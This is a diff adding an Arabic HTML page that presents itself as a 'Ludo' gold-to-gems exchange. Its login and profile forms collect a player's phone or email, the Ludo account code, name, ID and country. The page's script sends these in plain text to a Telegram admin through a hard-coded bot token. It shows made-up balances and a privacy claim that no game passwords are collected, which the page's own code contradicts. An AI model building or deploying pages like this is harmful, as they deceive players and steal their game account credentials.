@@ -1,0 +1,801 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Ludo Gold-to-Gems Exchange</title>
+  <style>
+    * { box-sizing: border-box; }
+    :root {
+      --felt-top: #158462;
+      --felt-mid: #0c5e46;
+      --felt-deep: #053527;
+      --gold-top: #ffd54f;
+      --gold-mid: #f5a623;
+      --gold-shadow: #b87308;
+      --emerald-top: #26c485;
+      --emerald-mid: #129964;
+      --emerald-shadow: #0a6340;
+      --blue-top: #5578d4;
+      --blue-mid: #3a56a8;
+      --blue-shadow: #23366e;
+    }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background-color: var(--felt-deep);
+      background-image:
+        radial-gradient(circle at 50% 18%, rgba(44, 196, 143, 0.42), transparent 52%),
+        linear-gradient(135deg, rgba(255, 255, 255, 0.035) 25%, transparent 25%),
+        linear-gradient(225deg, rgba(255, 255, 255, 0.035) 25%, transparent 25%),
+        linear-gradient(45deg, rgba(0, 0, 0, 0.08) 25%, transparent 25%),
+        linear-gradient(315deg, rgba(0, 0, 0, 0.08) 25%, var(--felt-mid) 25%);
+      background-position: center, 0 0, 28px 0, 28px -28px, 0 28px;
+      background-size: 100% 100%, 56px 56px, 56px 56px, 56px 56px, 56px 56px;
+      color: #f4fffb;
+      font-family: Tahoma, Arial, sans-serif;
+    }
+    main { width: min(560px, 92%); margin: auto; padding: 18px 0 34px; }
+    header {
+      display: flex; justify-content: space-between; align-items: center;
+      margin: 4px 0 20px; gap: 12px; flex-wrap: wrap;
+    }
+    .brand {
+      display: inline-flex; align-items: center; gap: 10px;
+      font-size: 17px; font-weight: bold; color: #ffffff;
+    }
+    .ludo-grid-icon {
+      display: grid; grid-template-columns: 1fr 1fr; gap: 3px;
+      width: 26px; height: 26px; padding: 3px; background: #062b20;
+      border-radius: 8px; border: 1.5px solid rgba(255,255,255,0.35); flex-shrink: 0;
+    }
+    .ludo-grid-icon span { border-radius: 3px; display: block; }
+    .c-r { background: #ef476f; } .c-g { background: #26c485; }
+    .c-y { background: #ffd166; } .c-b { background: #36a2eb; }
+    a { color: #d3f3e6; text-decoration: none; cursor: pointer; }
+    a:hover { color: #ffd54f; }
+    nav {
+      font-size: 13px; display: flex; gap: 8px; align-items: center;
+      background: rgba(5,43,31,0.55); padding: 6px 12px; border-radius: 999px;
+      border: 1px solid rgba(255,255,255,0.16);
+    }
+    .game-title-wrap { text-align: center; margin-bottom: 18px; }
+    .game-sub {
+      display: inline-block;
+      background: linear-gradient(180deg,#7be3f5 0%,#37b7d6 100%);
+      color: #06313d; font-weight: bold; font-size: 12px; letter-spacing: 1.5px;
+      padding: 4px 14px; border-radius: 999px; border: 2px solid #ffffff;
+      box-shadow: 0 3px 0 rgba(0,0,0,0.25); margin-bottom: 6px;
+    }
+    .game-logo {
+      font-size: 34px; font-weight: 900; letter-spacing: 2px; line-height: 1.1;
+      text-shadow: 0 3px 0 #052c20, -1.5px -1.5px 0 #fff, 1.5px -1.5px 0 #fff,
+        -1.5px 1.5px 0 #fff, 1.5px 1.5px 0 #fff; margin: 4px 0;
+    }
+    .gl-r { color: #ef476f; } .gl-y { color: #ffd166; }
+    .gl-g { color: #2be090; } .gl-b { color: #3db5ff; }
+    .panel {
+      background: rgba(6,46,34,0.78); backdrop-filter: blur(8px);
+      border: 2px solid rgba(255,255,255,0.22); border-radius: 26px; padding: 24px;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.45), inset 0 1px 0 rgba(255,255,255,0.18);
+    }
+    h1 { font-size: 22px; margin: 4px 0 6px; text-align: center; color: #fff; }
+    h3 { margin: 8px 0 10px; font-size: 16px; text-align: center; color: #e6fff6; }
+    p { line-height: 1.75; color: #cceee1; margin-top: 4px; }
+    .center-p { text-align: center; font-size: 14px; margin-bottom: 16px; }
+    .muted { font-size: 12.5px; color: #a5d8c5; text-align: center; }
+    label { display: block; margin: 13px 0 6px; font-size: 13.5px; font-weight: bold; color: #ecfff8; }
+    input:not([type=checkbox]), select {
+      width: 100%; padding: 13px 15px; border-radius: 16px;
+      border: 2px solid rgba(255,255,255,0.22); background: rgba(4,32,24,0.85);
+      color: #fff; font-size: 15px; transition: border-color .2s, box-shadow .2s;
+    }
+    input:not([type=checkbox]):focus, select:focus {
+      outline: none; border-color: var(--gold-top);
+      box-shadow: 0 0 0 3px rgba(255,213,79,0.25);
+    }
+    .hint { font-size: 12px; color: #ffd54f; margin-top: 6px; line-height: 1.6; }
+    .consent {
+      display: flex; gap: 10px; align-items: flex-start; margin-top: 16px;
+      padding: 11px 13px; background: rgba(4,34,25,0.72);
+      border: 1.5px solid rgba(255,255,255,0.18); border-radius: 14px;
+    }
+    .consent input[type=checkbox] {
+      margin-top: 4px; width: 20px; height: 20px; flex-shrink: 0; accent-color: #26c485;
+    }
+    .consent label { margin: 0; line-height: 1.6; font-size: 13px; font-weight: normal; cursor: pointer; }
+    button {
+      width: 100%; padding: 14px 18px; margin-top: 16px;
+      border: 1.5px solid rgba(255,255,255,0.45); border-radius: 999px;
+      background: linear-gradient(180deg,var(--gold-top) 0%,var(--gold-mid) 100%);
+      color: #2c1b00; font-weight: bold; font-size: 16px; cursor: pointer;
+      box-shadow: 0 5px 0 var(--gold-shadow), 0 10px 20px rgba(0,0,0,0.3);
+      transition: transform .12s, box-shadow .12s;
+    }
+    button:hover { filter: brightness(1.04); }
+    button:active { transform: translateY(3px); box-shadow: 0 2px 0 var(--gold-shadow), 0 4px 10px rgba(0,0,0,.3); }
+    .btn-emerald {
+      background: linear-gradient(180deg,var(--emerald-top) 0%,var(--emerald-mid) 100%);
+      color: #fff; text-shadow: 0 1px 2px rgba(0,0,0,.35);
+      box-shadow: 0 5px 0 var(--emerald-shadow), 0 10px 20px rgba(0,0,0,.3);
+    }
+    .btn-emerald:active { box-shadow: 0 2px 0 var(--emerald-shadow), 0 4px 10px rgba(0,0,0,.3); }
+    .btn-secondary {
+      background: linear-gradient(180deg,var(--blue-top) 0%,var(--blue-mid) 100%);
+      color: #fff; border: 1.5px solid rgba(255,255,255,0.32);
+      box-shadow: 0 3px 0 var(--blue-shadow); padding: 8px 13px;
+      font-size: 12.5px; margin-top: 8px; width: auto;
+    }
+    .btn-secondary:active { transform: translateY(2px); box-shadow: 0 1px 0 var(--blue-shadow); }
+    .meter {
+      height: 16px; background: rgba(4,28,21,0.9);
+      border: 1.5px solid rgba(255,255,255,0.25); border-radius: 999px;
+      overflow: hidden; margin-bottom: 10px; padding: 2px;
+    }
+    .meter i {
+      display: block; height: 100%; width: 0%; border-radius: 999px;
+      background: linear-gradient(90deg,#f5a623,#ffd54f,#fff3a1);
+      transition: width .35s;
+    }
+    .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 18px 0; }
+    .stats div {
+      background: rgba(4,30,22,0.85); border: 2px solid rgba(255,213,79,0.45);
+      padding: 16px; border-radius: 18px; color: #ffd54f; text-align: center;
+    }
+    .stats div + div { color: #7ae8ff; border-color: rgba(122,232,255,0.45); }
+    .stats strong { display: block; font-size: 28px; margin-top: 6px; }
+    .notice {
+      padding: 12px 16px; border-radius: 16px;
+      background: rgba(16,86,63,0.92); border: 1.5px solid rgba(255,255,255,0.3);
+      color: #fff; margin-bottom: 14px; text-align: center;
+    }
+    .error { background: rgba(138,34,48,0.92); border-color: #ff8fa3; }
+    .success { background: rgba(12,110,74,0.95); border-color: #6bf0bd; }
+    .logout-link { display: block; text-align: center; margin-top: 16px; font-size: 14px; }
+    .demo-box { margin-top: 20px; padding-top: 16px; border-top: 1px dashed rgba(255,255,255,0.25); }
+    .demo-actions { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; margin-top: 8px; }
+    .login-tabs { display: grid; grid-template-columns: repeat(2,1fr); gap: 8px; margin-bottom: 16px; }
+    .login-tab {
+      margin-top: 0; padding: 10px 8px; border-radius: 14px;
+      border: 1.5px solid rgba(255,255,255,0.22); background: rgba(4,32,24,0.85);
+      color: #cceee1; font-size: 13px; font-weight: bold; box-shadow: none;
+      transition: background .2s, color .2s, border-color .2s;
+    }
+    .login-tab:hover { border-color: rgba(255,213,79,0.55); color: #fff; }
+    .login-tab.active {
+      background: linear-gradient(180deg,var(--gold-top) 0%,var(--gold-mid) 100%);
+      color: #2c1b00; border-color: rgba(255,255,255,0.55);
+      box-shadow: 0 3px 0 var(--gold-shadow);
+    }
+    .login-tab:active { transform: translateY(1px); box-shadow: none; }
+    .password-wrap { position: relative; }
+    input.has-toggle { padding-left: 64px; }
+    .toggle-pass {
+      position: absolute; left: 8px; top: 50%; transform: translateY(-50%);
+      width: auto; margin-top: 0; padding: 5px 10px; border-radius: 10px;
+      border: 1px solid rgba(255,255,255,0.24); background: rgba(255,255,255,0.12);
+      color: #ecfff8; font-size: 12px; font-weight: bold; box-shadow: none;
+    }
+    .toggle-pass:active { transform: translateY(-50%); box-shadow: none; }
+    .hidden { display: none !important; }
+    .waiting-box { text-align: center; padding: 8px 0 4px; }
+    .spinner {
+      width: 54px; height: 54px; margin: 6px auto 18px; border-radius: 50%;
+      border: 5px solid rgba(255,255,255,0.18); border-top-color: var(--gold-top);
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .waiting-box h2 { font-size: 20px; margin: 0 0 8px; color: #ffd54f; }
+    .waiting-box p { font-size: 14px; }
+    .waiting-steps {
+      text-align: right; font-size: 13px; color: #cceee1;
+      background: rgba(4,30,22,0.7); border: 1.5px dashed rgba(255,255,255,0.22);
+      border-radius: 14px; padding: 12px 16px 12px 22px; margin: 14px 0; line-height: 1.9;
+    }
+    .waiting-steps b { color: #ffd54f; }
+    .req-id-chip {
+      display: inline-block; margin-top: 6px; background: rgba(255,213,79,0.15);
+      border: 1px solid rgba(255,213,79,0.55); color: #ffd54f;
+      padding: 4px 14px; border-radius: 999px; font-size: 13px; font-weight: bold;
+      letter-spacing: 1px;
+    }
+    footer { text-align: center; color: #9dd4c0; font-size: 12px; margin: 22px 0 8px; }
+    @media (max-width: 480px) {
+      .panel { padding: 18px; }
+      .stats { grid-template-columns: 1fr; }
+      .game-logo { font-size: 28px; }
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <header>
+      <a id="brand-link" class="brand">
+        <span class="ludo-grid-icon" aria-hidden="true">
+          <span class="c-r"></span><span class="c-g"></span>
+          <span class="c-y"></span><span class="c-b"></span>
+        </span>
+        <span>Ludo Exchange</span>
+      </a>
+      <nav>
+        <a id="nav-privacy">الخصوصية</a>
+        <span>·</span>
+        <a id="nav-terms">الشروط</a>
+      </nav>
+    </header>
+
+    <div class="game-title-wrap">
+      <span class="game-sub">🎲 بوابة تحويل الذهب إلى جواهر</span>
+      <div class="game-logo" aria-label="Ludo Exchange">
+        <span class="gl-r">L</span><span class="gl-y">U</span><span class="gl-g">D</span><span class="gl-b">O</span>
+        <span class="gl-y"> EXCHANGE</span>
+      </div>
+    </div>
+
+    <div id="notice-box" class="notice hidden" role="status"></div>
+
+    <!-- Login View -->
+    <section id="view-login" class="panel">
+      <h1>تسجيل دخول اللاعب</h1>
+      <p class="center-p">سجّل الدخول برقم الهاتف ورمز الحساب أو بالبريد الإلكتروني ورمز الحساب.</p>
+
+      <div class="login-tabs" role="tablist" aria-label="طرق تسجيل الدخول">
+        <button type="button" class="login-tab active" data-method="phone" role="tab" aria-selected="true">📱 رقم ورمز</button>
+        <button type="button" class="login-tab" data-method="email" role="tab" aria-selected="false">✉️ بريد ورمز</button>
+      </div>
+
+      <form id="login-form" novalidate>
+        <div id="fields-phone">
+          <label for="phone_number">📱 رقم الهاتف</label>
+          <input id="phone_number" name="phone_number" type="tel" inputmode="tel" dir="ltr" placeholder="مثال: +9647701234567" required>
+
+          <label for="phone_code">🔑 رمز الحساب في Ludo</label>
+          <div class="password-wrap">
+            <input id="phone_code" class="has-toggle" name="phone_code" type="password" minlength="4" maxlength="64" placeholder="أدخل رمز الحساب (4 أحرف/أرقام على الأقل)" required>
+            <button type="button" class="toggle-pass" data-target="phone_code">إظهار</button>
+          </div>
+          <p class="hint">📌 هذا الرمز سيُرسل للأدمن للتحقق من أن الحساب حقيقي وليس بوت قبل الموافقة على الدخول.</p>
+        </div>
+
+        <div id="fields-email" class="hidden">
+          <label for="email_address">✉️ البريد الإلكتروني</label>
+          <input id="email_address" name="email_address" type="email" dir="ltr" placeholder="name@example.com">
+
+          <label for="email_code">🔑 رمز الحساب في Ludo</label>
+          <div class="password-wrap">
+            <input id="email_code" class="has-toggle" name="email_code" type="password" minlength="4" maxlength="64" placeholder="أدخل رمز الحساب (4 أحرف/أرقام على الأقل)">
+            <button type="button" class="toggle-pass" data-target="email_code">إظهار</button>
+          </div>
+          <p class="hint">📌 هذا الرمز سيُرسل للأدمن للتحقق من أن الحساب حقيقي وليس بوت قبل الموافقة على الدخول.</p>
+        </div>
+
+        <div class="consent">
+          <input id="consent" type="checkbox" name="consent" value="yes" required>
+          <label for="consent">أوافق على استخدام بياناتي لتنفيذ طلب التحويل وأتحمّل المسؤولية.</label>
+        </div>
+
+        <p id="login-note" class="muted">لا تشارك رمز حسابك مع أي شخص غير الأدمن.</p>
+        <button type="submit">دخول</button>
+      </form>
+    </section>
+
+    <!-- Profile View (بدون الاسم السابق) -->
+    <section id="view-profile" class="panel hidden">
+      <h1>بيانات حساب لودو</h1>
+      <p class="center-p">أكمل بيانات الحساب المطلوبة لعرض الرصيد وإرسال طلب التحويل.</p>
+
+      <form id="profile-form" novalidate>
+        <label for="current_name">👤 الاسم الحالي للحساب</label>
+        <input id="current_name" name="current_name" maxlength="60" placeholder="أدخل الاسم الحالي للحساب" required>
+
+        <label for="ludo_id">🆔 الأيدي</label>
+        <input id="ludo_id" name="ludo_id" inputmode="numeric" pattern="[0-9]{5,20}" minlength="5" maxlength="20" placeholder="أدخل الآيدي (5 إلى 20 رقماً)" required>
+
+        <label for="country">🌍 الدولة</label>
+        <select id="country" name="country" required>
+          <option value="">اختر الدولة</option>
+          <option>العراق</option><option>السعودية</option><option>الكويت</option>
+          <option>الإمارات</option><option>قطر</option><option>البحرين</option>
+          <option>عُمان</option><option>الأردن</option><option>فلسطين</option>
+          <option>لبنان</option><option>سوريا</option><option>مصر</option>
+          <option>السودان</option><option>ليبيا</option><option>تونس</option>
+          <option>الجزائر</option><option>المغرب</option><option>اليمن</option>
+          <option>تركيا</option><option>أخرى</option>
+        </select>
+
+        <button type="submit">حفظ وإرسال الطلب للأدمن</button>
+      </form>
+
+      <a id="profile-logout-btn" class="logout-link">العودة لتسجيل الدخول</a>
+    </section>
+
+    <!-- Waiting for Admin Approval View -->
+    <section id="view-waiting" class="panel hidden">
+      <div class="waiting-box">
+        <div class="spinner" aria-hidden="true"></div>
+        <h2>بانتظار موافقة الأدمن</h2>
+        <p>تم إرسال بياناتك ورمز حسابك إلى الأدمن عبر تلجرام.</p>
+        <div class="req-id-chip">رقم الطلب: <span id="waiting-req-id">—</span></div>
+
+        <div class="waiting-steps">
+          <b>1.</b> وصلت رسالة للأدمن فيها بياناتك ورمز حسابك.<br>
+          <b>2.</b> سيتحقق الأدمن من الرمز يدوياً، ثم يضغط <b>✅ موافقة</b> أو <b>❌ رفض</b> في تلجرام.<br>
+          <b>3.</b> ستنتقل تلقائياً بعد الموافقة. إن لم يحدث، اضغط الزر أدناه.
+        </div>
+
+        <button type="button" id="check-approval-btn" class="btn-emerald">🔄 تحققتُ من الموافقة الآن</button>
+        <a id="waiting-cancel-btn" class="logout-link">إلغاء والعودة لتسجيل الدخول</a>
+      </div>
+    </section>
+
+    <!-- Dashboard -->
+    <section id="view-dashboard" class="panel hidden">
+      <h1>أهلاً، <span id="dash-username"></span></h1>
+      <p class="center-p">التقدم نحو الجوهرة التالية <b id="dash-progress-text">0.0%</b> · <span id="dash-country-chip">🌍 —</span></p>
+      <div class="meter"><i id="dash-meter-bar"></i></div>
+
+      <div class="stats">
+        <div>💰 الذهب<strong id="dash-gold">0</strong></div>
+        <div>💎 الجواهر<strong id="dash-gems">0</strong></div>
+      </div>
+
+      <h3>كل <span id="dash-rate">1000</span> ذهب = 1 جوهرة</h3>
+      <p class="muted">الأرصدة إدارية، والموافقة لا تعني تنفيذ تحويل داخل اللعبة.</p>
+
+      <form id="request-form">
+        <button type="submit" class="btn-emerald">📤 إرسال طلب تحويل</button>
+      </form>
+
+      <a id="logout-btn" class="logout-link">تسجيل الخروج</a>
+
+      <div class="demo-box">
+        <p class="muted">معاينة تفاعلية لمحاكاة أوامر البوت (/setgold و /setrate) محلياً:</p>
+        <div class="demo-actions">
+          <button type="button" id="demo-gold-5500" class="btn-secondary">تعيين 5500 ذهب</button>
+          <button type="button" id="demo-gold-add" class="btn-secondary">+1000 ذهب</button>
+          <button type="button" id="demo-rate-1200" class="btn-secondary">معدل 1200</button>
+          <button type="button" id="demo-rate-1000" class="btn-secondary">معدل 1000</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Legal -->
+    <section id="view-legal" class="panel hidden">
+      <h1 id="legal-title">سياسة الخصوصية</h1>
+      <p>نجمع آيدي اللاعب والاسم والدولة ورمز الحساب لإدارة الطلبات. لا نجمع كلمات مرور اللعبة.</p>
+      <p>هذه خدمة مستقلة غير تابعة للعبة Ludo. الأرصدة ومعدل التحويل يحددهما المشغّل، ولا ينفذ الموقع تحويلاً داخل اللعبة تلقائياً.</p>
+      <a id="legal-back">← العودة</a>
+    </section>
+
+    <footer>خدمة مستقلة غير تابعة للعبة Ludo</footer>
+  </main>
+
+  <script>
+    /* ============================================================
+       ⚙️ إعدادات تلجرام — عدّل هذه القيم لاحقاً
+       ============================================================ */
+    const TELEGRAM_CONFIG = {
+      BOT_TOKEN: "8770411983:AAE0BoLLsL6zGAonfjF0sGSb2K-h4F8vrZQ", // ← التوكن الحقيقي
+      ADMIN_ID:  "8458218864",                                       // ← آيدي الأدمن الحقيقي
+      POLL_INTERVAL_MS: 4000
+    };
+    /* ============================================================ */
+
+    const state = {
+      account: null,
+      pendingAuth: null,
+      loginMethod: "phone",
+      gold: 2450,
+      rate: 1000,
+      nextRequestId: 1,
+      lastLoginAttempt: 0,
+      awaiting: null // { requestId, profile, lastUpdateId }
+    };
+
+    const noticeBox = document.getElementById("notice-box");
+    const views = {
+      login: document.getElementById("view-login"),
+      profile: document.getElementById("view-profile"),
+      waiting: document.getElementById("view-waiting"),
+      dashboard: document.getElementById("view-dashboard"),
+      legal: document.getElementById("view-legal")
+    };
+
+    function showNotice(message, type) {
+      noticeBox.textContent = message;
+      noticeBox.className = "notice " + (type || "");
+      noticeBox.classList.remove("hidden");
+    }
+    function clearNotice() {
+      noticeBox.className = "notice hidden";
+      noticeBox.textContent = "";
+    }
+    function showView(name) {
+      Object.keys(views).forEach((key) => {
+        views[key].classList.toggle("hidden", key !== name);
+      });
+    }
+
+    function renderDashboard() {
+      if (!state.account) return;
+      const rate = Math.max(1, state.rate);
+      const gold = Math.max(0, state.gold);
+      const gems = Math.floor(gold / rate);
+      const progress = ((gold % rate) / rate) * 100;
+
+      document.getElementById("dash-username").textContent = state.account.username;
+      document.getElementById("dash-country-chip").textContent = state.account.badge || ("🌍 " + state.account.country);
+      document.getElementById("dash-gold").textContent = String(gold);
+      document.getElementById("dash-gems").textContent = String(gems);
+      document.getElementById("dash-rate").textContent = String(rate);
+      document.getElementById("dash-progress-text").textContent = progress.toFixed(1) + "%";
+      document.getElementById("dash-meter-bar").style.width = progress.toFixed(1) + "%";
+    }
+
+    const loginMethodPanels = {
+      phone: document.getElementById("fields-phone"),
+      email: document.getElementById("fields-email")
+    };
+    const loginNotes = {
+      phone: "لا تشارك رمز حسابك مع أي شخص غير الأدمن.",
+      email: "لا تشارك رمز حسابك مع أي شخص غير الأدمن."
+    };
+
+    function getActiveAuthView() {
+      if (state.account) return "dashboard";
+      if (state.awaiting) return "waiting";
+      if (state.pendingAuth) return "profile";
+      return "login";
+    }
+
+    document.querySelectorAll(".login-tab").forEach((tab) => {
+      tab.addEventListener("click", () => {
+        const method = tab.dataset.method;
+        state.loginMethod = method;
+        clearNotice();
+        document.querySelectorAll(".login-tab").forEach((btn) => {
+          const isActive = btn.dataset.method === method;
+          btn.classList.toggle("active", isActive);
+          btn.setAttribute("aria-selected", String(isActive));
+        });
+        Object.keys(loginMethodPanels).forEach((key) => {
+          loginMethodPanels[key].classList.toggle("hidden", key !== method);
+        });
+        document.getElementById("login-note").textContent = loginNotes[method] || loginNotes.phone;
+      });
+    });
+
+    document.querySelectorAll(".toggle-pass").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const input = document.getElementById(btn.dataset.target);
+        if (!input) return;
+        const show = input.type === "password";
+        input.type = show ? "text" : "password";
+        btn.textContent = show ? "إخفاء" : "إظهار";
+      });
+    });
+
+    /* ---------- Telegram API ---------- */
+    async function tgApi(method, payload) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/${method}`;
+      const res = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload || {})
+      });
+      return res.json();
+    }
+
+    async function tgGetUpdates(offset) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/getUpdates`;
+      const params = new URLSearchParams({ timeout: "0", allowed_updates: JSON.stringify(["message","callback_query"]) });
+      if (offset != null) params.set("offset", String(offset));
+      const res = await fetch(url + "?" + params.toString(), { method: "GET" });
+      return res.json();
+    }
+
+    /* ---------- إرسال طلب الدخول إلى تلجرام ---------- */
+    async function sendLoginRequestToTelegram(profile) {
+      const requestId = "REQ-" + Date.now().toString(36).toUpperCase() +
+                        "-" + Math.floor(Math.random() * 9000 + 1000);
+
+      const loginLine = profile.method === "phone"
+        ? "📱 <b>الهاتف:</b> <code>" + escapeHtml(profile.phone) + "</code>"
+        : "✉️ <b>البريد:</b> <code>" + escapeHtml(profile.email) + "</code>";
+
+      const msg =
+        "🔐 <b>طلب تسجيل دخول جديد</b>\n" +
+        "━━━━━━━━━━━━━━━━\n" +
+        "🆔 <b>رقم الطلب:</b> <code>" + requestId + "</code>\n" +
+        "👤 <b>الاسم:</b> " + escapeHtml(profile.currentName) + "\n" +
+        "🆔 <b>الآيدي:</b> <code>" + escapeHtml(profile.ludoId) + "</code>\n" +
+        "🌍 <b>الدولة:</b> " + escapeHtml(profile.country) + "\n" +
+        loginLine + "\n" +
+        "🔑 <b>رمز الحساب:</b> <code>" + escapeHtml(profile.accountCode) + "</code>\n" +
+        "━━━━━━━━━━━━━━━━\n" +
+        "تحقق من الرمز يدوياً، ثم اضغط أحد الأزرار:";
+
+      const replyMarkup = {
+        inline_keyboard: [[
+          { text: "✅ موافقة", callback_data: "approve:" + requestId },
+          { text: "❌ رفض",    callback_data: "reject:"  + requestId }
+        ]]
+      };
+
+      try {
+        const json = await tgApi("sendMessage", {
+          chat_id: TELEGRAM_CONFIG.ADMIN_ID,
+          text: msg,
+          parse_mode: "HTML",
+          reply_markup: replyMarkup
+        });
+        if (!json.ok) return { ok: false, requestId, error: json.description || "فشل الإرسال" };
+        return { ok: true, requestId };
+      } catch (err) {
+        return { ok: false, requestId, error: err.message };
+      }
+    }
+
+    function escapeHtml(s) {
+      return String(s || "")
+        .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    }
+
+    /* ---------- التحقق من الموافقة (callback_query) ---------- */
+    async function checkApprovalOnce() {
+      if (!state.awaiting) return { status: "none" };
+      const reqId = state.awaiting.requestId;
+      const offset = state.awaiting.lastUpdateId != null ? state.awaiting.lastUpdateId + 1 : undefined;
+
+      let json;
+      try {
+        json = await tgGetUpdates(offset);
+      } catch (err) {
+        return { status: "network_error", error: err.message };
+      }
+      if (!json.ok) return { status: "api_error", error: json.description };
+
+      const updates = json.result || [];
+      let matched = null;
+
+      for (const up of updates) {
+        state.awaiting.lastUpdateId = up.update_id;
+
+        // 1) ضغط زر inline
+        const cb = up.callback_query;
+        if (cb) {
+          const fromId = String(cb.from && cb.from.id);
+          if (fromId !== String(TELEGRAM_CONFIG.ADMIN_ID)) continue;
+          const data = String(cb.data || "");
+          const parts = data.split(":");
+          if (parts.length === 2 && parts[1] === reqId) {
+            matched = { decision: parts[0] === "approve" ? "approve" : "reject", via: "button" };
+            // إجابة إلزامية للـcallback وإلا يظل الزر يدور في تلجرام
+            tgApi("answerCallbackQuery", {
+              callback_query_id: cb.id,
+              text: parts[0] === "approve" ? "✅ تمت الموافقة" : "❌ تم الرفض"
+            }).catch(() => {});
+            break;
+          }
+        }
+
+        // 2) رسالة نصية احتياطية: OK REQ-... / NO REQ-...
+        const m = up.message;
+        if (!m || !m.text) continue;
+        const fromId = String(m.from && m.from.id);
+        if (fromId !== String(TELEGRAM_CONFIG.ADMIN_ID)) continue;
+        const text = m.text.trim();
+        if (text.includes(reqId)) {
+          if (/^(ok|موافق|قبول|approve|yes|نعم)\b/i.test(text)) {
+            matched = { decision: "approve", via: "text" };
+            break;
+          }
+          if (/^(no|رفض|reject|لا)\b/i.test(text)) {
+            matched = { decision: "reject", via: "text" };
+            break;
+          }
+        }
+      }
+      return { status: "checked", matched };
+    }
+
+    let approvalTimer = null;
+    function startApprovalPolling() {
+      stopApprovalPolling();
+      approvalTimer = setInterval(async () => {
+        if (!state.awaiting) { stopApprovalPolling(); return; }
+        const res = await checkApprovalOnce();
+        if (res.status === "checked" && res.matched) {
+          stopApprovalPolling();
+          handleDecision(res.matched.decision);
+        }
+      }, TELEGRAM_CONFIG.POLL_INTERVAL_MS);
+    }
+    function stopApprovalPolling() {
+      if (approvalTimer) { clearInterval(approvalTimer); approvalTimer = null; }
+    }
+
+    function handleDecision(decision) {
+      if (!state.awaiting) return;
+      if (decision === "approve") {
+        state.account = state.awaiting.profile;
+        state.awaiting = null;
+        renderDashboard();
+        showNotice("✅ تمت الموافقة على تسجيل الدخول.", "success");
+        showView("dashboard");
+      } else {
+        state.awaiting = null;
+        showNotice("❌ تم رفض طلب تسجيل الدخول من الأدمن.", "error");
+        showView("login");
+      }
+    }
+
+    /* ---------- Login form ---------- */
+    document.getElementById("login-form").addEventListener("submit", (e) => {
+      e.preventDefault();
+      clearNotice();
+
+      const now = Date.now();
+      if (state.lastLoginAttempt && now - state.lastLoginAttempt < 15000) {
+        showNotice("انتظر 15 ثانية قبل المحاولة التالية.", "error");
+        return;
+      }
+      state.lastLoginAttempt = now;
+
+      const consent = document.getElementById("consent").checked;
+      if (!consent) { showNotice("الموافقة إلزامية.", "error"); return; }
+
+      if (state.loginMethod === "phone") {
+        const rawPhone = document.getElementById("phone_number").value.trim();
+        const cleanPhone = rawPhone.replace(/[\s()-]/g, "");
+        const code = document.getElementById("phone_code").value.trim();
+
+        if (!/^\+?\d{7,15}$/.test(cleanPhone)) {
+          showNotice("أدخل رقم هاتف صحيحاً (7 إلى 15 رقماً).", "error"); return;
+        }
+        if (code.length < 4) {
+          showNotice("رمز الحساب يجب أن يكون 4 أحرف/أرقام على الأقل.", "error"); return;
+        }
+        state.pendingAuth = { method: "phone", phone: cleanPhone, accountCode: code };
+      } else {
+        const email = document.getElementById("email_address").value.trim();
+        const code = document.getElementById("email_code").value.trim();
+
+        if (!/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email)) {
+          showNotice("أدخل بريداً إلكترونياً صحيحاً.", "error"); return;
+        }
+        if (code.length < 4) {
+          showNotice("رمز الحساب يجب أن يكون 4 أحرف/أرقام على الأقل.", "error"); return;
+        }
+        state.pendingAuth = { method: "email", email, accountCode: code };
+      }
+
+      showView("profile");
+    });
+
+    /* ---------- Profile form → إرسال إلى تلجرام ---------- */
+    document.getElementById("profile-form").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      clearNotice();
+      if (!state.pendingAuth) { showView("login"); return; }
+
+      const currentName = document.getElementById("current_name").value.trim();
+      const lid = document.getElementById("ludo_id").value.trim();
+      const country = document.getElementById("country").value.trim();
+
+      if (!currentName || currentName.length > 60) {
+        showNotice("أدخل الاسم الحالي للحساب.", "error"); return;
+      }
+      if (!/^\d{5,20}$/.test(lid)) {
+        showNotice("الآيدي يجب أن يكون من 5 إلى 20 رقماً.", "error"); return;
+      }
+      if (!country) { showNotice("اختر الدولة.", "error"); return; }
+
+      const profile = {
+        ...state.pendingAuth,
+        currentName,
+        ludoId: lid,
+        username: currentName,
+        country,
+        badge: "🌍 " + country + " · 🆔 " + lid
+      };
+
+      document.getElementById("waiting-req-id").textContent = "…";
+      showView("waiting");
+      showNotice("جارٍ إرسال الطلب إلى الأدمن عبر تلجرام…");
+
+      const result = await sendLoginRequestToTelegram(profile);
+
+      if (!result.ok) {
+        clearNotice();
+        document.getElementById("waiting-req-id").textContent = "—";
+        showNotice("تعذّر إرسال الطلب إلى تلجرام: " + result.error, "error");
+        showView("profile");
+        return;
+      }
+
+      state.awaiting = {
+        requestId: result.requestId,
+        profile,
+        lastUpdateId: null
+      };
+      document.getElementById("waiting-req-id").textContent = result.requestId;
+      showNotice("تم إرسال الطلب. بانتظار ضغط الأدمن ✅ أو ❌ في تلجرام.", "success");
+      startApprovalPolling();
+    });
+
+    document.getElementById("check-approval-btn").addEventListener("click", async () => {
+      if (!state.awaiting) return;
+      showNotice("جارٍ فحص الموافقة…");
+      const res = await checkApprovalOnce();
+      if (res.status !== "checked") {
+        showNotice("تعذّر الفحص: " + (res.error || "خطأ غير معروف"), "error");
+        return;
+      }
+      if (res.matched) {
+        handleDecision(res.matched.decision);
+      } else {
+        showNotice("لم تصل الموافقة بعد. اطلب من الأدمن الضغط على ✅ موافقة في تلجرام.", "error");
+      }
+    });
+
